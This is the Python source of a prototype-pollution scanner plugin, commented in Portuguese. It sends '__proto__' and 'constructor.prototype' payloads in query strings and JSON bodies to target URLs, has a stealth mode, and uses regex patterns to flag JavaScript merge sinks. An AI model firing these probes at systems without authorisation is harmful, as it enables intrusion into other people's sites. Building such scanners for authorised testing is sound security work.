#!/usr/bin/env python3
"""
Prototype Pollution Detection (V10.3 Precision) — Detecta poluição de protótipos JavaScript.
Analisa sinks avançados, testa via query-string e JSON body, e realiza prova de conceito prática.
V10.3: httpx.Client reuse, dedup de resultados, URL normalization.
"""
import json
import time
import re
import httpx
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

# Padrões Pro (V10.1) — Sinks avançados
JS_SINK_PATTERNS = [
    (r"Object\.assign\s*\(", "Object.assign"),
    (r"_\.merge\s*\(", "lodash.merge"),
    (r"Object\.defineProperty\s*\(", "Object.defineProperty"),
    (r"JSON\.parse\s*\(", "JSON.parse sink"),
    (r"__proto__", "__proto__ ref"),
]

# V10.2: Sinks adicionais
JS_SINK_PATTERNS_V10_2 = [
    (r"\$\.extend\s*\(", "jQuery.extend"),
    (r"_\.defaultsDeep\s*\(", "lodash.defaultsDeep"),
    (r"_\.set\s*\(", "lodash.set"),
    (r"deepmerge\s*\(", "deepmerge"),
    (r"merge\s*\(\s*\{", "generic merge"),
    (r"Object\.create\s*\(", "Object.create"),
    (r"Reflect\.set\s*\(", "Reflect.set"),
    (r"\.constructor\s*\[", "constructor bracket access"),
]

def _test_pollution(client: httpx.Client, url: str) -> list:
    """Testa payloads de prototype pollution com prova de conceito prática. Reutiliza sessão."""
    findings = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs: return []

    # V10.2: Baseline check para reduzir FP
    try:
        baseline_resp = client.get(url, headers={"User-Agent": DEFAULT_USER_AGENT})
        baseline_body = baseline_resp.text.lower()
    except Exception:
        return []

    # Payloads V10.1 + V10.2
    payloads = [
        ("__proto__[polluted]", "allma_v10_1"),
        ("constructor[prototype][polluted]", "allma_v10_1"),
        ("__proto__[toString]", "allma_v10_1_override"),
        ("__proto__[constructor][prototype][polluted]", "allma_v10_2"),
        ("constructor.prototype.polluted", "allma_v10_2"),
        ("__proto__[hasOwnProperty]", "allma_v10_2_hop"),
        ("__proto__[valueOf]", "allma_v10_2_valueof"),
    ]

    for p_key, p_val in payloads:
        time.sleep(REQUEST_DELAY)
        test_qs = qs.copy()
        test_qs[p_key] = [p_val]
        new_query = urlencode(test_qs, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

        try:
            resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
            body = resp.text.lower()
            
            if resp.status_code >= 400:
                continue

            is_vuln = False
            reason = ""
            
            if p_val in body and p_val not in baseline_body:
                is_vuln = True
                reason = f"Poluição confirmada: Valor '{p_val}' injetado via '{p_key}' aparece no response (ausente no baseline)"
            elif p_val in body:
                if p_key not in body or body.count(p_val) > body.count(p_key):
                    is_vuln = True
                    reason = f"Poluição detectada: Valor '{p_val}' refletido via merge de objeto (Payload: {p_key})"

            if is_vuln:
                findings.append({
                    "url": url,
                    "test_url": test_url,
                    "type": "PROTOTYPE_POLLUTION",
                    "risk": "HIGH",
                    "details": reason,
                    "payload": f"{p_key}={p_val}",
                    "request_raw": format_http_request(resp.request),
                    "response_raw": format_http_response(resp),
                })
                break
        except Exception:
            pass
    return findings


def _test_pollution_json(client: httpx.Client, url: str) -> list:
    """V10.2: Testa prototype pollution via JSON body em endpoints API. Reutiliza sessão."""
    findings = []
    
    json_payloads = [
        {"__proto__": {"polluted": "allma_v10_2_json"}},
        {"constructor": {"prototype": {"polluted": "allma_v10_2_json"}}},
    ]
    
    for payload in json_payloads:
        time.sleep(REQUEST_DELAY)
        try:
            resp = client.post(
                url,
                json=payload,
                headers={"User-Agent": DEFAULT_USER_AGENT, "Content-Type": "application/json"}
            )
            body = resp.text.lower()
            
            if "allma_v10_2_json" in body and resp.status_code < 400:
                findings.append({
                    "url": url,
                    "type": "PROTOTYPE_POLLUTION",
                    "risk": "HIGH",
                    "method": "POST (JSON)",
                    "details": f"Prototype Pollution via JSON body: valor injetado refletido no response.",
                    "payload": json.dumps(payload),
                    "request_raw": format_http_request(resp.request),
                    "response_raw": format_http_response(resp),
                })
                return findings  # Um achado por URL basta
        except Exception:
            pass
    return findings


def _scan_js_sinks(target: str) -> list:
    """Análise estática de JS para mapear potenciais sinks."""
    js_dir = Path("output") / target / "jsscanner"
    hints = []
    js_analysis_file = js_dir / "js_analysis.json"
    
    all_patterns = JS_SINK_PATTERNS + JS_SINK_PATTERNS_V10_2
    
    if js_analysis_file.exists():
        try:
            js_data = json.loads(js_analysis_file.read_text())
            for url, content in js_data.items():
                content_str = str(content)
                for pattern, name in all_patterns:
                    if re.search(pattern, content_str):
                        hints.append({
                            "url": url,
                            "type": "JS_SINK_DETECTED",
                            "risk": "MEDIUM",
                            "details": f"Sink vulnerável detectado em JS: '{name}'",
                            "sink": name
                        })
        except: pass
    return hints

def run(context: dict):
    target = context.get("target")
    stealth = context.get("stealth", False)
    deep = context.get("deep", False)
    if not target:
        raise ValueError("Target required")

    info(f"🧪 {C.BOLD}{C.CYAN}PROTOTYPE POLLUTION SCANNER (V10.3 PRECISION){C.END}")
    outdir = ensure_outdir(target, "prototype_pollution")

    # 1. Static
    js_hints = _scan_js_sinks(target)
    
    # 2. Dynamic (Query String)
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    candidates = []
    if urls_file.exists():
        urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
        candidates = [u for u in urls if "?" in u and target in u]
    
    # V10.3: Dedup URLs
    candidates = list(set(u.rstrip("/") for u in candidates))[:80]
    max_workers = 3 if stealth else 10
    
    param_results = []
    found_urls = set()  # V10.3: Dedup resultados
    
    # V10.3: Uma única sessão httpx para todos os testes
    with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True) as client:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(_test_pollution, client, url): url for url in candidates}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    for f in res:
                        if f["url"] not in found_urls:
                            found_urls.add(f["url"])
                            param_results.append(f)
                            info(f"   🔴 {C.RED}[POLLUTION]{C.END} Confirmado em {f['url']}")

        # 3. V10.2: Dynamic (JSON Body) — somente deep mode (reusa sessão)
        json_results = []
        if deep:
            info(f"   🔎 [DEEP] Testando Prototype Pollution via JSON body...")
            api_candidates = []
            if urls_file.exists():
                urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
                api_candidates = [u for u in urls if any(kw in u.lower() for kw in ["/api/", "/graphql", "/rest/", "/v1/", "/v2/"])]
            
            api_candidates = list(set(u.rstrip("/") for u in api_candidates))[:30]
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(_test_pollution_json, client, url): url for url in api_candidates}
                for future in as_completed(futures):
                    res = future.result()
                    if res:
                        for f in res:
                            if f["url"] not in found_urls:
                                found_urls.add(f["url"])
                                json_results.append(f)
                                info(f"   🔴 {C.RED}[POLLUTION JSON]{C.END} Confirmado em {f['url']}")

    all_results = param_results + json_results + js_hints
    output_file = outdir / "prototype_pollution_results.json"
    output_file.write_text(json.dumps(all_results, indent=2))
    
    # V10.3: Summary
    summary = {"urls_tested": len(candidates), "findings": len(param_results) + len(json_results), "js_sinks": len(js_hints), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))
    
    success(f"   📂 Resultados salvos em {output_file}")
    return all_results
